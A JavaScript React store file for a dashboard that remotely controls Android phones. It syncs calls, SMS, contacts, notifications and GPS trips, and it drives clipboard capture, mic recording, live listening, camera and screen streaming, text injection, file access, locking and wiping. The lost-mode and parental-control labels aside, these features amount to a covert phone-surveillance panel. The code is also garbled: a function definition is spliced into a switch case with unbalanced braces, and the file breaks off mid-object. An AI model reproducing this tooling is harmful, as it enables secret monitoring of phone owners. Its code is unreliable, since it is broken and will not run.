import { useState, useCallback, useEffect, useMemo, createContext, useContext, useRef } from 'react';

// Resolve the relay WS URL from wherever the dashboard is served.
// - https page (ngrok / any domain on 443) → wss://same-host
// - localhost dev → ws://localhost:5000
// - LAN IP dev → ws://same-host:5000
// REST calls are relative ('/api/...') so they follow the page origin too.
const WS_URL = (() => {
  const { protocol, hostname, port } = window.location;
  if (protocol === 'https:') return `wss://${hostname}${port ? `:${port}` : ''}`;
  if (hostname === 'localhost' || hostname === '127.0.0.1') return 'ws://localhost:5000';
  return `ws://${hostname}:5000`;
})();

const StoreContext = createContext(null);

export function StoreProvider({ children }) {
  const [devices, setDevices] = useState({});
  const [activeDeviceId, setActiveDeviceId] = useState(null);
  const [currentTab, setCurrentTab] = useState('calls');
  const [callLogsSubTab, setCallLogsSubTab] = useState('history');
  const [calls, setCalls] = useState({});
  const [messages, setMessages] = useState({});
  const [locations, setLocations] = useState({});
  const [contacts, setContacts] = useState({});
  const [files, setFiles] = useState({ path: '/', entries: [], downloadBuffer: '' });
  const [notifications, setNotifications] = useState([]);
  const [connected, setConnected] = useState(false);
  const [incomingCallAlert, setIncomingCallAlert] = useState(null);
  const [smsAlert, setSmsAlert] = useState(null);
  const [toasts, setToasts] = useState([]);

  // Round 3 remote control & telemetry states
  const [deviceInfo, setDeviceInfo] = useState({});
  const [installedApps, setInstalledApps] = useState({});
  const [wifiInfo, setWifiInfo] = useState({});
  const [clipboardHistory, setClipboardHistory] = useState([]);
  const [clipboardCapture, setClipboardCapture] = useState({});
  const [appPermissions, setAppPermissions] = useState({});
  const [callBlocklist, setCallBlocklist] = useState({});
  const [micRecording, setMicRecording] = useState(false);
  const [latestMicAudio, setLatestMicAudio] = useState(null);
  const [cameraCapturing, setCameraCapturing] = useState(false);
  const [latestCameraPhoto, setLatestCameraPhoto] = useState(null);
  const [screenshotCapturing, setScreenshotCapturing] = useState(false);
  const [latestScreenshot, setLatestScreenshot] = useState(null);
  const [screenRecording, setScreenRecording] = useState(false);
  const [latestScreenFrame, setLatestScreenFrame] = useState(null);
  const [cameraStreaming, setCameraStreaming] = useState(false);
  const [latestCameraFrame, setLatestCameraFrame] = useState(null);
  const [torchOn, setTorchOn] = useState(false);
  const [liveListening, setLiveListening] = useState(false);
  const [latestAudioChunk, setLatestAudioChunk] = useState(null);
  const [volumeInfo, setVolumeInfo] = useState({});
  const [batteryStats, setBatteryStats] = useState({});
  const [lostModeState, setLostModeState] = useState({});
  const [galleryPhotos, setGalleryPhotos] = useState({});
  const [galleryLoading, setGalleryLoading] = useState(false);
  const [cellularInfo, setCellularInfo] = useState({});
  const [dndStatus, setDndStatus] = useState({});
  const [strobeActive, setStrobeActive] = useState(false);
  const [junkScanData, setJunkScanData] = useState({});
  const [isScanningJunk, setIsScanningJunk] = useState(false);
  const [motionAlarmState, setMotionAlarmState] = useState({});
  const [walkieTalkieActive, setWalkieTalkieActive] = useState(false);
  const [deviceSyncConfig, setDeviceSyncConfig] = useState({});
  const [parentalControlState, setParentalControlState] = useState({});
  const [appUsageData, setAppUsageData] = useState({});
  const ws = useRef(null);
  const alertTimers = useRef({});
  // Mirrors files.downloadBuffer for the stray-terminator guard below
  // (reading state inside setState-updater would be a side effect).
  const filesRef = useRef({ downloadBuffer: '', download: null });
  const downloadChunksRef = useRef([]);
  const setFilesTracked = useCallback((updater) => {
    setFiles((f) => {
      const next = typeof updater === 'function' ? updater(f) : updater;
      filesRef.current = next;
      return next;
    });
  }, []);

  const pushToast = useCallback((text, kind = 'info') => {
    const id = Date.now() + Math.random();
    setToasts((t) => [...t, { id, text, kind }]);
    setTimeout(() => setToasts((t) => t.filter((x) => x.id !== id)), 4000);
  }, []);

  const dismissAlert = useCallback(() => {
    if (alertTimers.current.incomingCall) clearTimeout(alertTimers.current.incomingCall);
    setIncomingCallAlert(null);
  }, []);

  const dismissSmsAlert = useCallback(() => {
    if (alertTimers.current.sms) clearTimeout(alertTimers.current.sms);
    setSmsAlert(null);
  }, []);

  useEffect(() => {
    let closedByUs = false;
    let retry;

    const connect = () => {
      const socket = new WebSocket(WS_URL);
      ws.current = socket;

      socket.onopen = () => setConnected(true);
      socket.onclose = () => {
        setConnected(false);
        if (!closedByUs) retry = setTimeout(connect, 2000);
      };
      socket.onerror = () => socket.close();

      socket.onmessage = (ev) => {
        let msg;
        try {
          msg = JSON.parse(ev.data);
        } catch {
          return;
        }
        handleEvent(msg);
      };
    };

    const handleEvent = (msg) => {
      const p = msg.payload || {};
      switch (msg.event) {
        case 'DEVICE_UPDATE': {
          setDevices((d) => ({ ...d, [p.deviceId]: p }));
          setActiveDeviceId((id) => id ?? p.deviceId);
          break;
        }

        case 'DEVICE_REGISTERED':
          break;

        case 'CALLS_SYNCED': {
          setCalls((c) => ({ ...c, [p.deviceId]: p.calls || [] }));
          const missed = (p.calls || []).find(
            (call) => call.type === 'missed' && Date.now() - call.timestamp < 60_000
          );
          if (missed) {
            setIncomingCallAlert({ ...missed, deviceId: p.deviceId });
            if (alertTimers.current.incomingCall) clearTimeout(alertTimers.current.incomingCall);
            alertTimers.current.incomingCall = setTimeout(() => setIncomingCallAlert(null), 8000);
          }
          break;
        }

        case 'SMS_SYNCED': {
          setMessages((m) => {
            const list = [...(m[p.deviceId] || []), ...(p.messages || [])];
            const seen = new Set();
            const unique = list.filter((msg) => {
              const key = `${msg.deviceId}:${msg.id}`;
              if (seen.has(key)) return false;
              seen.add(key);
              return true;
            });
            return { ...m, [p.deviceId]: unique };
          });
          const fresh = (p.messages || []).find(
            (message) => message.type === 1 && Date.now() - message.date < 60_000
          );
          if (fresh) {
            setSmsAlert({ ...fresh, deviceId: p.deviceId });
            if (alertTimers.current.sms) clearTimeout(alertTimers.current.sms);
            alertTimers.current.sms = setTimeout(() => setSmsAlert(null), 6000);
          }
          break;
        }

        case 'LOCATION_UPDATE': {
          if (p.error) {
            pushToast(`Location: ${p.error}`, 'error');
            break;
          }
          setLocations((l) => ({
            ...l,
            [p.deviceId]: {
              latitude: p.latitude,
              longitude: p.longitude,
              accuracy: p.accuracy,
              speed: p.speed,
              altitude: p.altitude,
              bearing: p.bearing,
              timestamp: p.timestamp
            }
          }));
          break;
        }

        case 'INCOMING_CALL_RING': {
          setIncomingCallAlert({ ...p, deviceId: p.deviceId, type: 'incoming' });
          if (alertTimers.current.incomingCall) clearTimeout(alertTimers.current.incomingCall);
          alertTimers.current.incomingCall = setTimeout(() => setIncomingCallAlert(null), 12_000);
          break;
        }

        case 'FILE_LIST_RESPONSE': {
          setFilesTracked({ path: p.path || '/', entries: p.entries || [], error: p.error });
          break;
        }

        case 'FILE_DOWNLOAD_RESPONSE': {
          if (p.error) {
            downloadChunksRef.current = [];
            setFilesTracked((f) => ({ ...f, download: { error: p.error } }));
            pushToast(`Download failed: ${p.error}`, 'error');
            break;
          }
          if (p.data) {
            try {
              const bin = atob(p.data);
              const len = bin.length;
              const bytes = new Uint8Array(len);
              for (let i = 0; i < len; i++) {
                bytes[i] = bin.charCodeAt(i);
              }
              downloadChunksRef.current.push(bytes);
            } catch (err) {
              console.error('Chunk decode error:', err);
            }
          }
          if (p.isLastChunk) {
            const blob = new Blob(downloadChunksRef.current, { type: p.mimeType || 'application/octet-stream' });
            const blobUrl = URL.createObjectURL(blob);
            downloadChunksRef.current = [];
            setFilesTracked((f) => ({
              ...f,
              download: { name: p.name, mimeType: p.mimeType, blobUrl }
            }));
          }
          break;
        }

        case 'NOTIFICATION_POSTED': {
          const note = { ...p, id: p.key || `${p.deviceId}-${p.postTime}` };
          setNotifications((prev) => {
            const filtered = prev.filter((n) => n.key !== note.key);
            const next = [note, ...filtered];
            if (next.length > 200) next.length = 200;
            return next;
          });
          if (document.hidden && 'Notification' in window && Notification.permission === 'granted') {
            const title = p.title ? `${p.appName}: ${p.title}` : p.appName || 'New notification';
            try {
              const n = new Notification(title, { body: p.text || '', tag: note.key });
              n.onclick = () => { window.focus(); n.close(); };
            } catch (e) {
              // ignore
  }
}

function titleOrApp(appName, title, text) {
  if (title && text) return `${title} · ${appName || ''}`;
  if (title) return `${title} (${appName || 'Android'})`;
  if (text) return `${appName || 'Android'}: ${text}`;
  return appName || 'New notification';
}
          const toastText = titleOrApp(p.appName, p.title, p.text);
          pushToast(toastText, 'info');
          break;
        }

        case 'NOTIFICATION_REMOVED': {
          setNotifications((prev) => prev.filter((n) => n.key !== p.key));
          break;
        }

        case 'SEND_SMS_RESULT': {
          pushToast(p.success ? 'SMS sent' : `SMS failed: ${p.error || 'unknown error'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'CONTACTS_SYNCED': {
          setContacts((c) => ({ ...c, [p.deviceId]: p.contacts || [] }));
          break;
        }

        case 'ADD_CONTACT_RESULT': {
          pushToast(p.success ? `Contact ${p.name || ''} saved on phone` : `Add contact failed: ${p.error || 'unknown error'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'FIND_PHONE_STOPPED': {
          pushToast('Phone finder alarm stopped on device', 'success');
          break;
        }

        case 'DEVICE_REMOVED': {
          setDevices((d) => {
            const next = { ...d };
            delete next[p.deviceId];
            return next;
          });
          setActiveDeviceId((id) => (id === p.deviceId ? null : id));
          break;
        }

        // Round 3 remote control & telemetry responses
        case 'DEVICE_INFO_RESPONSE': {
          setDeviceInfo((prev) => ({ ...prev, [p.deviceId]: p }));
          break;
        }

        case 'INSTALLED_APPS_RESPONSE': {
          setInstalledApps((prev) => ({ ...prev, [p.deviceId]: p.apps || [] }));
          break;
        }

        case 'APP_PERMS_RESPONSE': {
          setAppPermissions((prev) => ({ ...prev, [p.packageName]: p.permissions || [] }));
          break;
        }

        case 'WIFI_RESPONSE': {
          setWifiInfo((prev) => ({ ...prev, [p.deviceId]: p }));
          break;
        }

        case 'CLIPBOARD_READ_RESPONSE': {
          if (p.text) {
            setClipboardHistory((prev) => [
              { id: Date.now(), deviceId: p.deviceId, text: p.text, timestamp: Date.now() },
              ...prev.filter((c) => c.text !== p.text)
            ].slice(0, 100));
            pushToast('Phone clipboard read successfully', 'success');
          } else {
            pushToast('Phone clipboard is currently empty', 'info');
          }
          break;
        }

        case 'CLIPBOARD_UPDATE': {
          if (p.text) {
            setClipboardHistory((prev) => [
              { id: p.id || Date.now(), deviceId: p.deviceId, text: p.text, timestamp: p.timestamp || Date.now() },
              ...prev.filter((c) => c.text !== p.text)
            ].slice(0, 100));
            pushToast('New clipboard text captured from phone', 'info');
          }
          break;
        }

        case 'VIBRATE_RESULT': {
          pushToast(p.success ? `Phone vibrated (${p.durationMs || 500}ms)` : `Vibrate failed: ${p.error || 'error'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'TTS_RESULT': {
          pushToast(p.success ? `Spoke: "${p.text}"` : `TTS failed: ${p.error || 'error'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'PLAY_AUDIO_RESULT': {
          if (p.playing) {
            pushToast('Audio playback started on device', 'success');
          } else if (p.error) {
            pushToast(`Audio error: ${p.error}`, 'error');
          } else {
            pushToast('Audio playback stopped', 'info');
          }
          break;
        }

        case 'WALLPAPER_RESULT': {
          pushToast(p.success ? 'Wallpaper updated successfully on phone' : `Wallpaper failed: ${p.error || 'error'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'LOCK_RESULT': {
          if (p.success) {
            pushToast('Device screen locked successfully', 'success');
          } else {
            pushToast(`Lock failed: ${p.error || 'Device Admin required'}`, 'error');
          }
          break;
        }

        case 'CALL_BLOCKLIST_RESULT': {
          if (p.deviceId) {
            setCallBlocklist((prev) => ({ ...prev, [p.deviceId]: { enabled: p.enabled, numbers: p.numbers || [] } }));
          }
          pushToast(p.success ? 'Call blocklist updated' : `Blocklist error: ${p.error}`, p.success ? 'success' : 'error');
          break;
        }

        case 'MIC_RECORD_RESULT': {
          setMicRecording(false);
          if (p.success) {
            setLatestMicAudio(p);
            pushToast(`Mic audio recorded (${p.durationSec || 15}s)`, 'success');
          } else {
            pushToast(`Mic record failed: ${p.error || 'error'}`, 'error');
          }
          break;
        }

        case 'CAMERA_CAPTURE_RESULT': {
          setCameraCapturing(false);
          if (p.success) {
            setLatestCameraPhoto(p);
            pushToast(`Photo captured (${p.facing || 'camera'})`, 'success');
          } else {
            pushToast(`Camera failed: ${p.error || 'error'}`, 'error');
          }
          break;
        }

        case 'SCREENSHOT_RESULT': {
          setScreenshotCapturing(false);
          if (p.success) {
            setLatestScreenshot(p);
            pushToast('Screenshot captured', 'success');
          } else {
            pushToast(`Screenshot failed: ${p.error || 'permission denied'}`, 'error');
          }
          break;
        }

        case 'SCREEN_RECORD_FRAME': {
          setLatestScreenFrame(p);
          break;
        }

        case 'CAMERA_STREAM_FRAME': {
          setLatestCameraFrame(p);
          break;
        }

        case 'TORCH_RESULT': {
          if (typeof p.torchOn === 'boolean') setTorchOn(p.torchOn);
          pushToast(p.success ? `Torch ${p.torchOn ? 'turned ON' : 'turned OFF'}` : `Torch error: ${p.error || 'failed'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'WIPE_RESULT': {
          pushToast(p.success ? 'Phone wipe command executed successfully' : `Wipe failed: ${p.error || 'Device Admin required'}`, p.success ? 'success' : 'error');
          break;
        }

        case 'LIVE_LISTEN_STATUS': {
          setLiveListening(!!p.active);
          if (p.error) pushToast(`Live listen: ${p.error}`, 'error');
          break;
        }

        case 'LIVE_AUDIO_CHUNK': {
          setLatestAudioChunk(p);
          break;
        }

        case 'VOLUME_INFO_RESPONSE':
        case 'VOLUME_SET_RESULT': {
          if (p.deviceId) {
            setVolumeInfo((prev) => ({ ...prev, [p.deviceId]: p }));
          }
          if (p.error) pushToast(`Volume: ${p.error}`, 'error');
          break;
        }

        case 'BATTERY_STATS_RESPONSE': {
          if (p.deviceId) {
            setBatteryStats((prev) => ({ ...prev, [p.deviceId]: p }));
          }
          break;
        }

        case 'INPUT_KEY_RESULT': {
          if (p.error) pushToast(`Virtual key error: ${p.error}`, 'error');
          break;
        }

        case 'INPUT_GESTURE_RESULT': {
          if (p.error) pushToast(`Gesture error: ${p.error}`, 'error');
          break;
        }

        case 'CLIPBOARD_WRITE_RESULT': {
          pushToast(p.success ? 'Text copied to phone clipboard' : `Clipboard error: ${p.error}`, p.success ? 'success' : 'error');
          break;
        }

        case 'OPEN_URL_RESULT': {
          pushToast(p.success ? `Opened on phone: ${p.url}` : `Failed to open URL: ${p.error}`, p.success ? 'success' : 'error');
          break;
        }

        case 'LAUNCH_APP_RESULT': {
          pushToast(p.success ? `Launched ${p.packageName}` : `Failed to launch app: ${p.error}`, p.success ? 'success' : 'error');
          break;
        }

        case 'LOST_MODE_STATUS':
        case 'LOST_MODE_RESULT': {
          if (p.deviceId) {
            setLostModeState((prev) => ({ ...prev, [p.deviceId]: p }));
          }
          if (p.message !== undefined) {
            pushToast(p.active ? '⚠️ Lost Mode ACTIVATED on device' : 'Lost Mode deactivated', p.active ? 'warning' : 'success');
          }
          break;
        }

        case 'MEDIA_GALLERY_RESPONSE': {
          setGalleryLoading(false);
          if (p.deviceId) {
            setGalleryPhotos((prev) => ({ ...prev, [p.deviceId]: p.photos || [] }));
          }
          break;
        }

        case 'INPUT_TEXT_RESULT': {
          if (p.success) {
            pushToast(`Injected text: "${p.text}"`, 'success');
          } else {
            pushToast(`Text injection failed: ${p.error || 'No focused field'}`, 'error');
          }
          break;
        }

        case 'SCREEN_WAKE_RESULT': {
          pushToast(p.success ? 'Screen wake signal sent to phone' : `Screen wake failed: ${p.error}`, p.success ? 'success' : 'error');
          break;
        }

        case 'CALL_ACTION_RESULT': {
          pushToast(p.success ? `Call ${p.action === 'answer' ? 'answered (Speaker ON)' : 'declined'}` : `Call action failed: ${p.error}`, p.success ? 'success' : 'error');
          if (p.success) dismissAlert();
          break;
        }

        case 'CELLULAR_INFO_RESPONSE': {
          if (p.deviceId) {
            setCellularInfo((prev) => ({ ...prev, [p.deviceId]: p }));
          }
          break;
        }

        case 'TORCH_STROBE_RESULT': {
          if (typeof p.strobeActive === 'boolean') setStrobeActive(p.strobeActive);
          pushToast(p.strobeActive ? '⚡ SOS Strobe Beacon ACTIVATED' : 'Strobe Beacon turned OFF', p.strobeActive ? 'warning' : 'info');
          break;
        }

        case 'JUNK_SCAN_RESPONSE': {
          setIsScanningJunk(false);
          if (p.deviceId) {
            setJunkScanData((prev) => ({ ...prev, [p.deviceId]: p }));
          }
          if (p.success) {
            pushToast(`Junk scan complete: ${( (p.totalJunkBytes || 0) / (1024 * 1024) ).toFixed(1)} MB found`, 'info');
          } else {
            pushToast(`Junk scan failed: ${p.error}`, 'error');
          }
          break;
        }

        case 'JUNK_CLEAN_RESULT': {
          if (p.success) {
            pushToast(`Cleaned ${p.deletedCount || 0} files (${((p.freedBytes || 0) / (1024 * 1024)).toFixed(1)} MB freed)`, 'success');
            if (activeDeviceId) sendCommand('junk-scan', { deviceId: activeDeviceId });
          } else {
            pushToast(`Clean failed: ${p.error}`, 'error');
          }
          break;
        }

        case 'DND_STATUS_RESPONSE':
        case 'DND_SET_RESULT': {
          if (p.deviceId) {
            setDndStatus((prev) => ({ ...prev, [p.deviceId]: p }));
          }
          if (p.appliedMode) {
            pushToast(`DND mode set to: ${p.appliedMode}`, 'success');
          } else if (p.error) {
            pushToast(`DND: ${p.error}`, 'error');
          }
          break;
        }

        case 'FILE_DELETE_RESULT': {
          if (p.success) {
            pushToast('File/folder deleted successfully', 'success');
          } else {
            pushToast(`Delete failed: ${p.error || 'Unknown error'}`, 'error');
          }
          break;
        }

        case 'FILE_RENAME_RESULT': {
          if (p.success) {
            pushToast(`Renamed to "${p.newName}"`, 'success');
          } else {
            pushToast(`Rename failed: ${p.error || 'Unknown error'}`, 'error');
          }
          break;
        }

        case 'FILE_MKDIR_RESULT': {
          if (p.success) {
            pushToast(`Folder "${p.folderName}" created`, 'success');
          } else {
            pushToast(`Create folder failed: ${p.error || 'Unknown error'}`, 'error');
          }
          break;
        }

        case 'FILE_MOVE_RESULT': {
          if (p.success) {
            pushToast(`Moved to "${p.destPath}"`, 'success');
          } else {
            pushToast(`Move failed: ${p.error || 'Unknown error'}`, 'error');
          }
          break;
        }

        case 'FILE_COPY_RESULT': {
          if (p.success) {
            pushToast(`Copied to "${p.destPath}"`, 'success');
          } else {
            pushToast(`Copy failed: ${p.error || 'Unknown error'}`, 'error');
          }
          break;
        }

        case 'UNINSTALL_APP_RESULT': {
          if (p.success) {
            pushToast('Uninstall prompt displayed on phone screen', 'success');
          } else {
            pushToast(`Uninstall failed: ${p.error || 'Unknown error'}`, 'error');
          }
          break;
        }

        case 'LOCATION_BATCH_UPDATE': {
          pushToast(`Synced ${p.count || (p.waypoints && p.waypoints.length) || 0} offline GPS trip points!`, 'success');
          break;
        }

        case 'LOCATIONS_CLEARED': {
          pushToast('Location trip history cleared', 'info');
          break;
        }

        case 'TIMELINE_CONFIG_RESULT': {
          if (p.success) {
            pushToast(
              p.enabled
                ? `Trip Recording ACTIVE (Idle Filter: ${p.minRadiusMeters}m / ${p.dwellMinutes}m)`
                : 'Trip Recording paused (Standby GPS mode)',
              p.enabled ? 'success' : 'info'
            );
          } else {
            pushToast(`Trip config error: ${p.error || 'Failed'}`, 'error');
          }
          break;
        }

        case 'CALL_OUTGOING_RESULT': {
          if (p.success) {
            pushToast(
              p.mode === 'direct_call' ? `Calling ${p.number}...` : `Dialer opened for ${p.number}`,
              'success'
            );
          } else {
            pushToast(`Call failed: ${p.error || 'Failed to place call'}`, 'error');
          }
          break;
        }

        case 'MOTION_ALARM_CONFIG_RESULT':
        case 'MOTION_ALARM_STATUS': {
          if (p.deviceId) {
            setMotionAlarmState((prev) => ({ ...prev, [p.deviceId]: p }));
          }
          if (typeof p.armed === 'boolean') {
            pushToast(p.armed ? '🛡️ Desk Theft Guard ARMED' : 'Theft Guard Disarmed', p.armed ? 'warning' : 'info');
          }
          break;
        }

        case 'MOTION_ALARM_TRIGGERED': {
          if (p.deviceId) {
            setMotionAlarmState((prev) => ({
              ...prev,
              [p.deviceId]: { ...(prev[p.deviceId] || {}), triggered: true }
            }));
          }
          pushToast(`🚨 THEFT ALERT: Motion detected on device! Desk alarm sounding!`, 'error');
          break;
        }

        case 'WALKIE_TALKIE_STATUS': {
          if (typeof p.active === 'boolean') {
            setWalkieTalkieActive(p.active);
          }
          break;
        }

        case 'INTRUDER_ALERT': {
          pushToast(`🚨 SECURITY INTRUDER ALERT: Wrong PIN/Pattern attempt #${p.attempts || 1} on lockscreen!`, 'error');
          break;
        }

        case 'SYNC_CONFIG_STATUS': {
          if (p.deviceId) {
            setDeviceSyncConfig((prev) => ({
              ...prev,
              [p.deviceId]: { ...(prev[p.deviceId] || {}), ...p }
            }));
          }
          break;
        }

        case 'PARENTAL_CONTROL_STATUS': {
          if (p.deviceId) {
            setParentalControlState((prev) => ({
              ...prev,
              [p.deviceId]: { ...(prev[p.deviceId] || {}), ...p }
            }));
          }
          pushToast(p.enabled ? '🛡️ Parental Controls & Screen Time ACTIVE' : 'Parental Controls turned OFF', p.enabled ? 'success' : 'info');
          break;
        }

        case 'APP_USAGE_RESPONSE': {
          if (p.deviceId) {
            setAppUsageData((prev) => ({
              ...prev,
              [p.deviceId]: p
            }));
          }
          break;
        }

        default:
          break;
      }
    };

    connect();

    return () => {
      closedByUs = true;
      clearTimeout(retry);
      ws.current?.close();
    };
  }, [pushToast]);

  useEffect(() => {
    fetch('/api/devices')
      .then((r) => r.json())
      .then((list) => {
        const mapped = {};
        list.forEach((d) => {
          mapped[d.id] = {
            deviceId: d.id,
            deviceName: d.name,
            battery: d.battery,
            isCharging: !!d.charging,
            last_seen: d.last_seen,
            online: d.online
          };
        });
        setDevices((prev) => ({ ...mapped, ...prev }));
      })
      .catch(() => {});
  }, []);

  const sendCommand = useCallback(async (path, body) => {
    try {
      const res = await fetch(`/api/command/${path}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      return await res.json();
    } catch (e) {
      return { success: false, error: String(e) };
    }
  }, []);

  useEffect(() => {
    if (!activeDeviceId) return;
    fetch(`/api/devices/${activeDeviceId}/calls`)
      .then((r) => r.json())
      .then((list) => setCalls((c) => ({ ...c, [activeDeviceId]: list })))
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/messages`)
      .then((r) => r.json())
      .then((list) =>
        setMessages((m) => ({
          ...m,
          [activeDeviceId]: list.map((x) => ({ ...x, deviceId: activeDeviceId }))
        }))
      )
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/notifications`)
      .then((r) => r.json())
      .then((list) => setNotifications(list))
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/contacts`)
      .then((r) => r.json())
      .then((list) => setContacts((c) => ({ ...c, [activeDeviceId]: list || [] })))
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/info`)
      .then((r) => r.json())
      .then((info) => { if (info) setDeviceInfo((prev) => ({ ...prev, [activeDeviceId]: info })); })
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/apps`)
      .then((r) => r.json())
      .then((apps) => setInstalledApps((prev) => ({ ...prev, [activeDeviceId]: apps || [] })))
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/wifi`)
      .then((r) => r.json())
      .then((wifi) => { if (wifi) setWifiInfo((prev) => ({ ...prev, [activeDeviceId]: wifi })); })
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/clipboard`)
      .then((r) => r.json())
      .then((list) => setClipboardHistory(list || []))
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/blocklist`)
      .then((r) => r.json())
      .then((b) => { if (b) setCallBlocklist((prev) => ({ ...prev, [activeDeviceId]: b })); })
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/cellular`)
      .then((r) => r.json())
      .then((info) => { if (info) setCellularInfo((prev) => ({ ...prev, [activeDeviceId]: info })); })
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/dnd`)
      .then((r) => r.json())
      .then((d) => { if (d) setDndStatus((prev) => ({ ...prev, [activeDeviceId]: d })); })
      .catch(() => {});
    fetch(`/api/devices/${activeDeviceId}/sync-config`)
      .then((r) => r.json())
      .then((cfg) => { if (cfg) setDeviceSyncConfig((prev) => ({ ...prev, [activeDeviceId]: cfg })); })
      .catch(() => {});
    sendCommand('volume-get', { deviceId: activeDeviceId }).catch(() => {});
    sendCommand('battery-stats', { deviceId: activeDeviceId }).catch(() => {});
    sendCommand('cellular-info', { deviceId: activeDeviceId }).catch(() => {});
    sendCommand('dnd-get', { deviceId: activeDeviceId }).catch(() => {});
  }, [activeDeviceId, sendCommand]);

  const value = useMemo(
    () => ({
      devices,
      activeDeviceId,
      setActiveDeviceId,
      activeDevice: activeDeviceId ? devices[activeDeviceId] : null,
      calls,
      messages,
      locations,
      contacts,
      files,
      notifications,
      connected,
      incomingCallAlert,
      smsAlert,
      dismissAlert,
      dismissSmsAlert,
      toasts,
      pushToast,
      sendCommand,
      // Round 3 remote controls & telemetry data
      deviceInfo: activeDeviceId ? deviceInfo[activeDeviceId] : null,
      installedApps: activeDeviceId ? (installedApps[activeDeviceId] || []) : [],
      wifiInfo: activeDeviceId ? wifiInfo[activeDeviceId] : null,
      clipboardHistory: activeDeviceId ? clipboardHistory.filter((c) => c.deviceId === activeDeviceId) : clipboardHistory,
      clipboardCapture: activeDeviceId ? !!clipboardCapture[activeDeviceId] : false,
      appPermissions,
      callBlocklist: activeDeviceId ? (callBlocklist[activeDeviceId] || { enabled: false, numbers: [] }) : { enabled: false, numbers: [] },
      vibratePhone: (durationMs, pattern) => sendCommand('vibrate', { deviceId: activeDeviceId, durationMs, pattern }),
      speakTts: (text, speed, pitch) => sendCommand('tts', { deviceId: activeDeviceId, text, speed, pitch }),
      playAudio: (urlOrOpts, loop, data) => {
        if (typeof urlOrOpts === 'object' && urlOrOpts !== null) {
          return sendCommand('play-audio', { deviceId: activeDeviceId, ...urlOrOpts });
        }
        return sendCommand('play-audio', { deviceId: activeDeviceId, url: urlOrOpts, loop, data });
      },
      stopAudio: () => sendCommand('play-audio-stop', { deviceId: activeDeviceId }),
      setWallpaper: (payload) => sendCommand('wallpaper', { deviceId: activeDeviceId, ...payload }),
      refreshDeviceInfo: () => sendCommand('device-info', { deviceId: activeDeviceId }),
      refreshInstalledApps: () => sendCommand('installed-apps', { deviceId: activeDeviceId }),
      fetchAppPerms: (packageName) => sendCommand('app-perms', { deviceId: activeDeviceId, packageName }),
      refreshWifiInfo: () => sendCommand('wifi-info', { deviceId: activeDeviceId }),
      readClipboard: () => sendCommand('clipboard-read', { deviceId: activeDeviceId }),
      lockDevice: () => sendCommand('lock', { deviceId: activeDeviceId }),
      syncCallBlocklist: (enabled, numbers) => sendCommand('call-blocklist-sync', { deviceId: activeDeviceId, enabled, numbers }),
      // Media remote controls & state
      micRecording,
      latestMicAudio: (latestMicAudio && latestMicAudio.deviceId === activeDeviceId) ? latestMicAudio : null,
      recordMic: (durationSec = 15) => {
        setMicRecording(true);
        sendCommand('mic-record', { deviceId: activeDeviceId, durationSec });
      },
      cameraCapturing,
      latestCameraPhoto: (latestCameraPhoto && latestCameraPhoto.deviceId === activeDeviceId) ? latestCameraPhoto : null,
      captureCamera: (facing = 'back') => {
        setCameraCapturing(true);
        sendCommand('camera-capture', { deviceId: activeDeviceId, facing });
      },
      screenshotCapturing,
      latestScreenshot: (latestScreenshot && latestScreenshot.deviceId === activeDeviceId) ? latestScreenshot : null,
      captureScreenshot: () => {
        setScreenshotCapturing(true);
        sendCommand('screenshot', { deviceId: activeDeviceId });
      },
      screenRecording,
      latestScreenFrame: (latestScreenFrame && latestScreenFrame.deviceId === activeDeviceId) ? latestScreenFrame : null,
      startScreenRecord: (fps = 15) => {
        setScreenRecording(true);
        sendCommand('screen-record-start', { deviceId: activeDeviceId, fps });
      },
      stopScreenRecord: () => {
        setScreenRecording(false);
        sendCommand('screen-record-stop', { deviceId: activeDeviceId });
      },
      cameraStreaming,
      latestCameraFrame: (latestCameraFrame && latestCameraFrame.deviceId === activeDeviceId) ? latestCameraFrame : null,
      startCameraStream: (facing = 'back', quality = 'low', fps = 15) => {
        setCameraStreaming(true);
        sendCommand('camera-stream-start', { deviceId: activeDeviceId, facing, quality, fps });
      },
      stopCameraStream: () => {
        setCameraStreaming(false);
        sendCommand('camera-stream-stop', { deviceId: activeDeviceId });
      },
      toggleClipboardCapture: (enable) => {
        setClipboardCapture((c) => ({ ...c, [activeDeviceId]: enable }));
        sendCommand(enable ? 'clipboard-enable' : 'clipboard-disable', { deviceId: activeDeviceId });
      },
      markNotificationRead: (key) => setNotifications((prev) => prev.map((n) => n.key === key ? { ...n, read: true } : n)),
      dismissNotification: (key) => {
        setNotifications((prev) => prev.filter((n) => n.key !== key));
        sendCommand('notification-dismiss', { deviceId: activeDeviceId, key });
      },
      dismissAllNotifications: () => {
        setNotifications([]);
        if (activeDeviceId) sendCommand('notification-clear-all', { deviceId: activeDeviceId });
      },
      // Section refresh: push actively held notifications from phone AND fetch stored log
      refreshNotifications: () => {
        if (!activeDeviceId) return;
        sendCommand('request-notifications', { deviceId: activeDeviceId });
        fetch(`/api/devices/${activeDeviceId}/notifications`)
          .then((r) => r.json())
          .then((list) => {
            if (Array.isArray(list) && list.length > 0) setNotifications(list);
          })
          .catch(() => {});
      },
      torchOn,
      toggleTorch: (enabled) => sendCommand('torch', { deviceId: activeDeviceId, enabled }),
      wipeDevice: (confirmation) => sendCommand('wipe-data', { deviceId: activeDeviceId, confirmation }),
      liveListening,
      latestAudioChunk: (latestAudioChunk && latestAudioChunk.deviceId === activeDeviceId) ? latestAudioChunk : null,
      startLiveListen: () => sendCommand('live-listen-start', { deviceId: activeDeviceId }),
